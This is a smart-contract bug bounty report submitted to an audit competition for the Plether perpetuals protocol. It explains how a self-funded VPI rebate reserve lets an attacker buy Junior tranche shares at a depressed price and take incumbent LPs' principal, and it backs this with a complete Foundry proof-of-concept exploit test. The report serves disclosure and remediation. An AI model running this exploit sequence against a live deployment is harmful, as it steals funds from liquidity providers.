# \#98865 [SC-Critical] Junior Share Underpricing During VPI Rebate Reserve Window Leads to Theft of Incumbent LP Principal

**Submitted on Nov 10th 2026 at 16:20:28 UTC by @rubencrxz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98865
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A single actor can buy Junior shares below their real value and redeem them at full value, using only permissionless actions. Their own skew-reducing open is paid a VPI rebate in cash from HousePool into a nonwithdrawable reserve, which LP pricing ignores, so the Junior share price drops. Their Junior deposit activates at that price, the position closes seconds later, and the lifetime VPI clamp returns the whole rebate to HousePool as revenue, most of which now belongs to the new shares. The difference is paid out of incumbent Junior LPs' principal, and the cycle repeats throughout every live market day.

## Vulnerability Details

Three pieces interact:

* Rebate payout: a skew-reducing open is paid its negative VPI in cash from HousePool, and that cash is locked as VPI rebate reserve under the trader's clearinghouse account (`CfdEngineSettlementSidecar.sol`, `MarginClearinghouse.sol`). The trader cannot withdraw it.
* LP pricing: the reconcile equity (`HousePoolAccountingLib.buildReconcileSnapshot`, physical assets − trader claims + terminal LP price delta) no longer includes that cash, and the reserve is kept out of the terminal price curve by design. Junior, as first-loss tranche, absorbs the whole drop.
* Clawback: the lifetime clamp prevents a position from ending with net-negative VPI (`CloseAccountingLib.sol`). On close, the reserve is returned to HousePool (`consumeVpiRebateReserve`, `MarginClearinghouse.sol`) and booked as revenue for the shares outstanding at that moment.

The reserve is therefore value that LPs are guaranteed to get back, but it is priced at zero while it is outstanding, and the actor who opens the position decides when that window starts and ends. Attack sequence, all permissionless:

1. `attackerSkew` opens a position that creates skew (below the 40% skew limit) and holds it. If enough organic skew exists, this step is not needed.
2. Just before a Junior deposit epoch activates, `attackerRebate` opens the opposite side. The skew-reducing open is paid a rebate into its reserve and the Junior share price drops.
3. `attackerLp`'s Junior deposit activates at the depressed price when any keeper calls `settleLpEpoch`.
4. `attackerRebate` closes right after activation. The clamp returns the full rebate to HousePool, and `attackerLp` receives its pro-rata share of that revenue.
5. After the cooldown, `attackerLp` redeems in full. Steps 2–5 repeat throughout the trading day; `attackerSkew` closes at the end.

Two addresses are needed for the trading legs because one account cannot hold both sides (`MUST_CLOSE_OPPOSING`). Both legs end with a lifetime VPI of exactly zero.

### Why this is not documented behavior

- The whitepaper's reason for the exclusion is to stop LPs **leaving** with an over-valued share. It does not address an LP **entering** at an under-valued share, which is what this attack does. `ACCOUNTING_SPEC.md` likewise only states that the reserve *"does not inflate marked LP receivables or symmetric LP NAV"* (over-valuation).
- `SECURITY.md` (*VPI limitations*) states that the lifetime clamp *"intentionally zeroes otherwise extractable rebate-only round trips"*. Here the round trip is rebate-only and the clamp zeroes it on both trading accounts, yet value is still extracted. The stated guarantee does not hold, so this is not the documented limitation.
- AI scan, *"Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"*: there a trader receives an excessive rebate. Here no trader receives any net rebate; the loss comes from LP share pricing.
- Not JIT liquidity: the attacker manufactures the dip with its own position and removes it 30 seconds later, and incumbents end **below their initial principal**, not just with less future income.
- No trusted role, no oracle manipulation and no Arbitrum/Pyth clock alignment: the price is constant during the whole PoC.

## Impact Details

Any actor with Junior-sized capital can repeatedly buy Junior shares below their real value and sell them back at full value, and the difference is paid by the LPs already in the tranche. The discount is not caused by market conditions or by another user's position: the attacker creates it with its own trade, places its deposit inside it, and removes it seconds later, so it can be repeated throughout every live market day.

The loss falls on incumbent Junior LPs as principal, not as forgone yield. Their share of the pool shrinks with every cycle, and their assets end below the value they held before the attack, even before any market movement. As Junior is the first-loss tranche, it absorbs the whole discount. The loss is final once the attacker redeems: no owner action, pause or recapitalization returns the funds to the affected LPs.

The attacker carries no exposure to the mechanism itself. Both of its trading positions end with zero lifetime VPI, so the clamp the protocol relies on to make rebate round trips worthless never applies a penalty, and the protocol records no anomaly: every action is an ordinary open, close, deposit or redemption executed by permissionless keepers. The rate of extraction grows with the attacker's share of the Junior tranche and with the size of the skew it can open, so the damage scales with the pool rather than being capped at a fixed amount.

## References

- HousePool payout: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L604-L611
- Reserve lock / consume: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L843 and #L884
- Settlement sidecar (payout, lock, revenue, clawback): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442 (also L458, L470, L604-L608, L621, L692)
- Open payout planning: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333
- Confidence price shift: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L904-L915
- Docs: `packages/perps/WHITEPAPER.md` (VPI section, reserve exclusion), `packages/perps/ACCOUNTING_SPEC.md` (terminal `K` and VPI reserve), `packages/perps/SECURITY.md` (VPI limitations)

## Proof of Concept

The PoC is a single Foundry test file that runs on commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It builds on the repository's own test base, `BasePerpTest`, and the only mocks are the out-of-scope components: Pyth (`MockPyth`, which relays signed prices) and USDG (`MockSettlementToken`). Release parameters from `packages/perps/DEPLOYMENT.md` are applied through the 72 h governance timelocks. Orders are committed through the base's `LegacyOrderRouterHarness`, which only translates the scalar commit into the production V3 request; `executeOrder` and `settleLpEpoch` are the production `OrderRouter` functions. The price is constant throughout; `vm.warp` only models the timelock and the passage of time between epochs.

Place the file at `packages/perps/test/poc/VpiRebateReserveNavExtraction.t.sol`.
From `packages/perps`, run:

```
forge test --match-path test/poc/VpiRebateReserveNavExtraction.t.sol -vv
```

If Foundry's auto-installer fails to resolve solc 0.8.35, set `FOUNDRY_SOLC` to the official 0.8.35 release binary.

**Steps reproduced**

Setup (owner and LPs, legitimate): release configuration through the timelocks. Incumbent LPs deposit 3M USDG into Junior and 7M into Senior; the attacker funds two trading accounts and one LP address.

Attack (permissionless): `attackerSkew` opens a SHORT of 39% of pool depth and holds it. Then, in each of 8 cycles (one every 3 hours of a live market day):
- 10 minutes before a deposit epoch activates, `attackerRebate` opens the opposite side (skew-reducing open, rebate locked as reserve).
- `attackerLp`'s Junior deposit activates at the depressed share price when an unrelated keeper calls `router.settleLpEpoch`.
- 30 seconds after activation, `attackerRebate` closes (the lifetime clamp returns the reserve to HousePool).
- After the 1 h cooldown, `attackerLp` requests redemption of all its shares, the keeper settles, and `attackerLp` claims.

Unwind: `attackerSkew` closes after the last exit, and both trading accounts withdraw their settlement balance. Every order is committed by its account and executed by the unrelated keeper in the next block.

Assertions (`test_attackerExtractsValueFromIncumbentJunior`):
- Attacker profit > 0, fully realized as USDG in its wallets.
- Incumbent loss > 0, and Junior final assets plus the Senior coupon gain stay below Junior assets at t0 (principal loss).
- Lifetime VPI == 0 on both trading accounts (accrued VPI plus the close-time delta read with `CfdEngineLens.previewClose` in the same block).
- `attackerLp`'s shares are fully claimable in its first exit epoch, in every cycle.
- Conservation: attacker profit + treasury and keeper fees = incumbent loss (tolerance of 4 atoms for `convertToAssets` rounding).

Negative control (`test_control_noLpLeg`): the same trading legs without the LP deposit. The attacker does not profit and incumbents do not lose.

Confidence cap (`test_attackerProfitAtConfidenceCap`): the same attack with the basket confidence at the 10 bps release cap and 7M of Junior capital. The attacker still profits.

**Expected output (excerpt)**

```
[PASS] test_attackerExtractsValueFromIncumbentJunior()
  attacker profit: 10576.692211
  fees (treasury + keeper): 26521.839
  incumbent loss: 37098.531211
[PASS] test_attackerProfitAtConfidenceCap()
  attacker profit: 1672.974866
  incumbent loss: 28195.164866
[PASS] test_control_noLpLeg()
  attacker profit: -30089.46516
  incumbent loss: -3567.62616
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Code:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

/// @title Self-funded VPI rebate reserve depresses Junior share price, letting one actor drain incumbent Junior principal
/// @notice attackerSkew holds a SHORT of 39% of pool depth. Before each LP activation attackerRebate opens the
///         opposite side; that skew-reducing open is paid a VPI rebate in cash from HousePool into a nonwithdrawable
///         reserve that LP NAV ignores, so attackerLp's Junior deposit activates at a depressed share price.
///         attackerRebate then closes, the lifetime-VPI clamp returns the whole rebate to HousePool, and attackerLp
///         exits after the cooldown. Price is constant; the only mocks are Pyth and USDG.
contract VpiRebateReserveNavExtractionTest is BasePerpTest {

    // Initial release parameters (packages/perps/DEPLOYMENT.md) set via the 72 h timelocks; the rest are defaults.
    uint256 internal constant RELEASE_VPI_FACTOR = 0.01e18;
    uint256 internal constant RELEASE_MAINT_MARGIN_BPS = 10;
    uint256 internal constant RELEASE_INIT_MARGIN_BPS = 20;
    uint256 internal constant RELEASE_BASKET_MAX_CONFIDENCE_RATIO_BPS = 10;
    uint256 internal constant RELEASE_ADVERSE_CONFIDENCE_MULTIPLIER_BPS = 2500;
    uint256 internal constant RELEASE_MIN_OPEN_NOTIONAL_ASSETS = 1000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant RELEASE_SEED_ASSETS = 1e6;

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant PYTH_CONFIDENCE_BPS = 1; // per feed, and therefore for the basket
    uint256 internal constant DAY_START = 1_710_201_600; // Tuesday 2024-03-12 00:00 UTC, live market all day
    uint256 internal constant FIRST_ACTIVATION = DAY_START + 4 hours;
    uint256 internal constant CYCLES = 8; // one every 3 hours: a full live day
    uint256 internal constant SKEW_CLOSE_TIME = FIRST_ACTIVATION + CYCLES * 3 hours - 55 minutes; // after the last exit
    uint256 internal constant SKEW_LOTS = 39_000; // 3.9M notional: 39% of the 10M depth
    uint256 internal constant SKEW_MARGIN = 300_000e6;
    uint256 internal constant REBATE_MARGIN = 30_000e6;
    uint256 internal constant LP_CAPITAL = 6_000_000e6;
    /// @dev At the confidence cap LP_CAPITAL nets the attacker a loss; the break-even is about 6.24M.
    uint256 internal constant LP_CAPITAL_AT_CONFIDENCE_CAP = 7_000_000e6;
    /// @dev All flows are transfers; convertToAssets loses < 2 atoms per incumbent tranche valuation, before and after.
    uint256 internal constant CONSERVATION_TOLERANCE_ATOMS = 4;

    address internal attackerSkew = makeAddr("attackerSkew");
    address internal attackerRebate = makeAddr("attackerRebate");
    address internal attackerLp = makeAddr("attackerLp");
    address internal incumbentJunior = makeAddr("incumbentJunior");
    address internal incumbentSenior = makeAddr("incumbentSenior");
    address internal keeper = makeAddr("keeper");
    address[7] internal accounts =
        [attackerSkew, attackerRebate, attackerLp, incumbentJunior, incumbentSenior, PROTOCOL_TREASURY_ACCOUNT, keeper];

    uint256 internal confidenceBps = PYTH_CONFIDENCE_BPS;
    int256 internal attackerProfit;
    int256 internal incumbentLoss;
    uint256 internal juniorPrincipal0;
    uint256 internal seniorPrincipal0;
    mapping(address => int256) internal lifetimeVpi;

    function setUp() public override {
        super.setUp();
        ICfdEngineAdminHost.EngineRiskConfig memory risk = _engineRiskConfig();
        risk.riskParams.vpiFactor = RELEASE_VPI_FACTOR;
        risk.riskParams.maintMarginBps = RELEASE_MAINT_MARGIN_BPS;
        risk.riskParams.initMarginBps = RELEASE_INIT_MARGIN_BPS;
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.basketMaxConfidenceRatioBps = RELEASE_BASKET_MAX_CONFIDENCE_RATIO_BPS;
        routerConfig.adverseConfidenceMultiplierBps = RELEASE_ADVERSE_CONFIDENCE_MULTIPLIER_BPS;
        routerConfig.minOpenNotionalAssets = RELEASE_MIN_OPEN_NOTIONAL_ASSETS;
        engineAdmin.proposeRiskConfig(risk);
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        _setSeniorCapacity(RELEASE_MAX_SENIOR_EXPOSURE_ASSETS, RELEASE_MAX_SENIOR_SHARE_BPS);
        vm.label(PROTOCOL_TREASURY_ACCOUNT, "treasury");
        // Senior admission is bounded by live Junior, so the incumbents enter in two consecutive epochs.
        vm.warp(DAY_START);
        settlementToken.mint(incumbentJunior, 3_000_000e6);
        settlementToken.mint(incumbentSenior, 7_000_000e6);
        _deposit(juniorVault, incumbentJunior, 3_000_000e6);
        _deposit(seniorVault, incumbentSenior, 7_000_000e6);
        _fundTrader(attackerSkew, SKEW_MARGIN + 100_000e6);
        _fundTrader(attackerRebate, REBATE_MARGIN + 50_000e6);
        settlementToken.mint(attackerLp, LP_CAPITAL);
    }

    /// @notice The attacker's three accounts profit at the incumbents' expense with zero lifetime VPI on both traders.
    function test_attackerExtractsValueFromIncumbentJunior() public {
        _run(true);
        assertGt(attackerProfit, 0, "attacker nets a profit");
        assertGt(incumbentLoss, 0, "incumbents lose");
        assertLt(
            juniorVault.totalAssets() + seniorVault.totalAssets() - seniorPrincipal0,
            juniorPrincipal0,
            "junior principal"
        );
        assertEq(lifetimeVpi[attackerSkew], 0, "attackerSkew lifetime VPI");
        assertEq(lifetimeVpi[attackerRebate], 0, "attackerRebate lifetime VPI");
    }

    /// @notice Without the LP leg the same trading cycle loses money for the attacker and costs incumbents nothing.
    function test_control_noLpLeg() public {
        _run(false);
        assertLe(attackerProfit, 0, "attacker does not profit");
        assertLe(incumbentLoss, 0, "incumbents do not lose");
    }

    /// @notice With the basket confidence at the 10 bps release cap the extraction still pays from 7M Junior capital.
    function test_attackerProfitAtConfidenceCap() public {
        confidenceBps = RELEASE_BASKET_MAX_CONFIDENCE_RATIO_BPS;
        settlementToken.mint(attackerLp, LP_CAPITAL_AT_CONFIDENCE_CAP - LP_CAPITAL);
        test_attackerExtractsValueFromIncumbentJunior();
    }

    /// @dev Runs the day, cashes the attacker out to its wallets, logs every balance and checks conservation.
    function _run(
        bool lpLeg
    ) private {
        uint256[7] memory before;
        for (uint256 i; i < 7; ++i) {
            before[i] = _balance(accounts[i]);
        }
        (juniorPrincipal0, seniorPrincipal0) = (juniorVault.totalAssets(), seniorVault.totalAssets());
        _openSkew();
        for (uint256 k; k < CYCLES; ++k) {
            _rebateCycle(FIRST_ACTIVATION + k * 3 hours, lpLeg);
        }
        _trade(attackerSkew, 0, true, SKEW_CLOSE_TIME);
        _withdrawAll(attackerSkew);
        _withdrawAll(attackerRebate);
        for (uint256 i; i < 3; ++i) {
            assertEq(_balance(accounts[i]), settlementToken.balanceOf(accounts[i]), "attacker fully realized in USDG");
        }
        int256[7] memory d;
        console2.log("USDG balances before -> after; basket confidence bps:", confidenceBps);
        for (uint256 i; i < 7; ++i) {
            uint256 afterBalance = _balance(accounts[i]);
            d[i] = int256(afterBalance) - int256(before[i]);
            console2.log("%s: %6e -> %6e", vm.getLabel(accounts[i]), before[i], afterBalance);
        }
        attackerProfit = d[0] + d[1] + d[2];
        incumbentLoss = -d[3] - d[4];
        console2.log("attacker profit: %6e", attackerProfit);
        console2.log("fees (treasury + keeper): %6e", d[5] + d[6]);
        console2.log("incumbent loss: %6e", incumbentLoss);
        assertApproxEqAbs(attackerProfit + d[5] + d[6], incumbentLoss, CONSERVATION_TOLERANCE_ATOMS, "conservation");
    }

    function _openSkew() private {
        _trade(attackerSkew, SKEW_MARGIN, false, FIRST_ACTIVATION - 70 minutes);
    }

    /// @dev Rebate leg, then (LP leg) the deposit activation, the clawback leg, then the LP exit after the cooldown.
    function _rebateCycle(
        uint256 activation,
        bool lpLeg
    ) private {
        _trade(attackerRebate, REBATE_MARGIN, false, activation - 10 minutes);
        uint256 shares = lpLeg ? _deposit(juniorVault, attackerLp, settlementToken.balanceOf(attackerLp)) : 0;
        _trade(attackerRebate, 0, true, activation + 30);
        if (lpLeg) {
            vm.warp(activation + 1 hours + 1 minutes);
            vm.prank(attackerLp);
            uint256 redeemId = juniorVault.requestRedeem(shares, attackerLp, attackerLp);
            _keeperSettle(activation + 2 hours);
            uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attackerLp);
            assertEq(claimable, shares, "all Junior shares redeemed in the first exit epoch");
            vm.prank(attackerLp);
            juniorVault.claimRedeem(redeemId, claimable, attackerLp, attackerLp);
        }
    }

    /// @dev The account commits at `at`; the keeper executes in the next block, the first one the router accepts.
    function _trade(
        address account,
        uint256 margin,
        bool isClose,
        uint256 at
    ) private {
        vm.warp(at);
        if (isClose) {
            (uint256 size,,,,,, int256 vpiAccrued) = engine.positions(account);
            lifetimeVpi[account] += vpiAccrued + engineLens.previewClose(account, size, PRICE).vpiDeltaAssets;
        }
        CfdTypes.Side side = account == attackerSkew ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, SKEW_LOTS * CfdTypes.SIZE_QUANTUM, margin, 0, isClose);
        bytes[] memory data = _tick();
        vm.prank(keeper);
        router.executeOrder(orderId, data);
    }

    function _withdrawAll(
        address account
    ) private {
        uint256 amount = clearinghouse.getAccountAssetBuckets(account).settlementBalanceAssets;
        vm.prank(account);
        clearinghouse.withdraw(account, amount);
    }

    /// @dev Public LP path: request (needs a mark from the last minute), keeper settlement at the epoch start, claim.
    function _deposit(
        TrancheVault vault,
        address owner,
        uint256 assets
    ) private returns (uint256 shares) {
        vm.startPrank(owner);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
        _keeperSettle(vault.depositEpochStart(requestId));
        uint256 claimable = vault.claimableDepositRequest(requestId, owner);
        vm.prank(owner);
        shares = vault.claimDeposit(requestId, claimable, owner, owner);
    }

    /// @dev Keeper settlement in the first block at `at`.
    function _keeperSettle(
        uint256 at
    ) private {
        vm.warp(at - 1);
        bytes[] memory data = _tick();
        vm.prank(keeper);
        router.settleLpEpoch(data);
    }

    function _tick() private returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        uint64 confidence = uint64(PRICE * confidenceBps / 10_000);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(PRICE)), confidence, int32(-8), publishTime, publishTime - 1
        );
        data = new bytes[](1);
        data[0] = abi.encode(PRICE);
    }

    /// @dev Wallet + clearinghouse settlement balance + tranche shares at the pending-reconcile share price.
    function _balance(
        address account
    ) private view returns (uint256) {
        return settlementToken.balanceOf(account)
            + clearinghouse.getAccountAssetBuckets(account).settlementBalanceAssets
            + juniorVault.convertToAssets(juniorVault.balanceOf(account))
            + seniorVault.convertToAssets(seniorVault.balanceOf(account));
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function _juniorSeedReceiver() internal view override returns (address) {
        return incumbentJunior;
    }

    function _seniorSeedReceiver() internal view override returns (address) {
        return incumbentSenior;
    }

}
```
